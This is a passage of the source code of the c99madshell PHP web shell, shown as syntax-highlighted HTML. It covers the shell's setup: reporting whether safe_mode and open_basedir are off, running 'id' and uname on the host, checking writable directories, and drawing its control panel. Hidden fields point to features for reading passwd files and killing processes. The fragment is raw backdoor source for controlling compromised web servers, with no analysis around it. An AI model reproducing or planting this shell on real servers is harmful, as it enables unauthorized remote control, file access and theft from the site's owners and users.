     <span class="k">else</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;gofile&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);}}</span>
<span class="c1">//Sending headers</span>
<span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">ob_implicit_flush</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">onphpshutdown</span><span class="p">()</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$gzipencode</span><span class="p">,</span><span class="nv">$ft</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">headers_sent</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$gzipencode</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ft</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;img&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">)))</span>
 <span class="p">{</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
  <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
  <span class="o">@</span><span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzHandler&quot;</span><span class="p">);</span>
  <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span>
  <span class="o">@</span><span class="nb">ob_end_flush</span><span class="p">();</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">c99shexit</span><span class="p">()</span>
<span class="p">{</span>
 <span class="nx">onphpshutdown</span><span class="p">();</span>
 <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">gmdate</span><span class="p">(</span><span class="s2">&quot;D, d M Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; GMT&quot;</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: post-check=0, pre-check=0&quot;</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: no-cache&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_tmp_dir&quot;</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">);</span>
<span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,</span><span class="si">$tmpdir</span><span class="s2">);</span>
<span class="s2">if (substr(</span><span class="si">$tmpdir</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$tmpdir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">if (empty(</span><span class="si">$tmpdir_logs</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir_logs</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">if (@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;) or strtolower(@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;)) == &quot;</span><span class="nx">on</span><span class="s2">&quot;)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$safemode</span><span class="s2"> = TRUE;</span>
<span class="s2"> </span><span class="si">$hsafemode</span><span class="s2"> = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ON</span> <span class="p">(</span><span class="nx">secure</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}</span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$safemode</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;OFF (not secure)&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$v</span><span class="s2"> = @ini_get(&quot;</span><span class="nx">open_basedir</span><span class="s2">&quot;);</span>
<span class="s2">if (</span><span class="si">$v</span><span class="s2"> or strtolower(</span><span class="si">$v</span><span class="s2">) == &quot;</span><span class="nx">on</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">else </span><span class="si">{</span><span class="nv">$openbasedir</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;OFF (not secure)&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$sort</span><span class="s2"> = htmlspecialchars(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="s2">if (empty(</span><span class="si">$sort</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$sort[1]</span><span class="s2"> = strtolower(</span><span class="si">$sort[1]</span><span class="s2">);</span>
<span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = getenv(&quot;</span><span class="nx">SERVER_SOFTWARE</span><span class="s2">&quot;);</span>
<span class="s2">if (!ereg(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),</span><span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="si">$DISP_SERVER_SOFTWARE</span><span class="s2"> = str_replace(&quot;</span><span class="nx">PHP</span><span class="o">/</span><span class="s2">&quot;.phpversion(),&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;phpinfo&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">));</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.bg&quot;</span><span class="p">,</span><span class="nv">$highlight_bg</span><span class="p">);</span> <span class="c1">//FFFFFF</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.comment&quot;</span><span class="p">,</span><span class="nv">$highlight_comment</span><span class="p">);</span> <span class="c1">//#FF8000</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.default&quot;</span><span class="p">,</span><span class="nv">$highlight_default</span><span class="p">);</span> <span class="c1">//#0000BB</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.html&quot;</span><span class="p">,</span><span class="nv">$highlight_html</span><span class="p">);</span> <span class="c1">//#000000</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.keyword&quot;</span><span class="p">,</span><span class="nv">$highlight_keyword</span><span class="p">);</span> <span class="c1">//#007700</span>
<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.string&quot;</span><span class="p">,</span><span class="nv">$highlight_string</span><span class="p">);</span> <span class="c1">//#DD0000</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span><span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
<span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$notls</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$ud</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x">&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1251&quot;&amp;gt;&amp;lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;en-us&quot;&amp;gt;&amp;lt;title&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"> - c99madshell&amp;lt;/title&amp;gt;&amp;lt;STYLE&amp;gt;TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&amp;gt;&amp;lt;form name=&#39;todo&#39; method=&#39;POST&#39;&amp;gt;&amp;lt;input name=&#39;act&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;grep&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;fullhexdump&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;base64&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;nixpasswd&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;pid&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;c&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;white&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;sig&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;processes_sort&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;d&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;sort&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;f&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;input name=&#39;ft&#39; type=&#39;hidden&#39; value=&#39;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;center&amp;gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=&quot;#C0C0C0&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th width=&quot;101%&quot; height=&quot;15&quot; nowrap bordercolor=&quot;#C0C0C0&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;font face=Webdings size=6&amp;gt;&amp;lt;b&amp;gt;!&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;font face=&quot;Verdana&quot; size=&quot;5&quot;&amp;gt;&amp;lt;b&amp;gt;C99madShell v. </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$shver</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;font face=Webdings size=6&amp;gt;&amp;lt;b&amp;gt;!&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;p align=&quot;left&quot;&amp;gt;&amp;lt;b&amp;gt;Software:&amp;nbsp;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;/p&amp;gt;&amp;lt;p align=&quot;left&quot;&amp;gt;&amp;lt;b&amp;gt;uname -a:&amp;nbsp;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">wordwrap</span><span class="p">(</span><span class="nb">php_uname</span><span class="p">(),</span><span class="mi">90</span><span class="p">,</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;/p&amp;gt;&amp;lt;p align=&quot;left&quot;&amp;gt;&amp;lt;b&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">wordwrap</span><span class="p">(</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">),</span><span class="mi">90</span><span class="p">,</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">get_current_user</span><span class="p">();}</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;/p&amp;gt;&amp;lt;p align=&quot;left&quot;&amp;gt;&amp;lt;b&amp;gt;Safe-mode:&amp;nbsp;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$hsafemode</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p align=&quot;left&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
<span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">if (empty(</span><span class="si">$d</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span><span class="si">}</span><span class="s2"> elseif(realpath(</span><span class="si">$d</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="si">$d</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$d</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,&quot;</span><span class="nx">\</span><span class="s2">&quot;,</span><span class="si">$d</span><span class="s2">);</span>
<span class="si">$dispd</span><span class="s2"> = htmlspecialchars(</span><span class="si">$d</span><span class="s2">);</span>
<span class="si">$pd</span><span class="s2"> = </span><span class="si">$e</span><span class="s2"> = explode(DIRECTORY_SEPARATOR,substr(</span><span class="si">$d</span><span class="s2">,0,-1));</span>
<span class="si">$i</span><span class="s2"> = 0;</span>
<span class="s2">foreach(</span><span class="si">$pd</span><span class="s2"> as </span><span class="si">$b</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$t</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2"> </span><span class="si">$j</span><span class="s2"> = 0;</span>
<span class="s2"> foreach (</span><span class="si">$e</span><span class="s2"> as </span><span class="si">$r</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$t</span><span class="s2">.= </span><span class="si">$r</span><span class="s2">.DIRECTORY_SEPARATOR;</span>
<span class="s2">  if (</span><span class="si">$j</span><span class="s2"> == </span><span class="si">$i</span><span class="s2">) {break;}</span>
<span class="s2">  </span><span class="si">$j</span><span class="s2">++;</span>
<span class="s2"> }</span>
<span class="s2"> echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
 <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$wd</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
 <span class="nv">$wdt</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;[ ok ]&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
 <span class="nv">$wd</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
 <span class="nv">$wdt</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;[ Read-Only ]&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;disk_free_space&quot;</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$free</span> <span class="o">=</span> <span class="nb">disk_free_space</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="nv">$total</span> <span class="o">=</span> <span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span><span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span><span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="nv">$used</span> <span class="o">=</span> <span class="nv">$total</span><span class="o">-</span><span class="nv">$free</span><span class="p">;</span>
 <span class="nv">$free_percent</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="mi">100</span><span class="o">/</span><span class="p">(</span><span class="nv">$total</span><span class="o">/</span><span class="nv">$free</span><span class="p">),</span><span class="mi">2</span><span class="p">);</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Free &quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$free</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; of &quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$total</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nv">$free_percent</span><span class="o">.</span><span class="s2">&quot;%)&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$letters</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$win</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$v</span><span class="s2"> = </span><span class="si">$v[0]</span><span class="s2">;</span>
<span class="s2"> foreach (range(&quot;</span><span class="nx">a</span><span class="s2">&quot;,&quot;</span><span class="nx">z</span><span class="s2">&quot;) as </span><span class="si">$letter</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$bool</span><span class="s2"> = </span><span class="si">$isdiskette</span><span class="s2"> = in_array(</span><span class="si">$letter</span><span class="s2">,</span><span class="si">$safemode_diskettes</span><span class="s2">);</span>
<span class="s2">  if (!</span><span class="si">$bool</span><span class="s2">) </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$letter</span><span class="o">.</span><span class="s2">&quot;:</span><span class="se">\&quot;</span><span class="s2">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  if (</span><span class="si">$bool</span><span class="s2">)</span>
<span class="s2">  {</span>
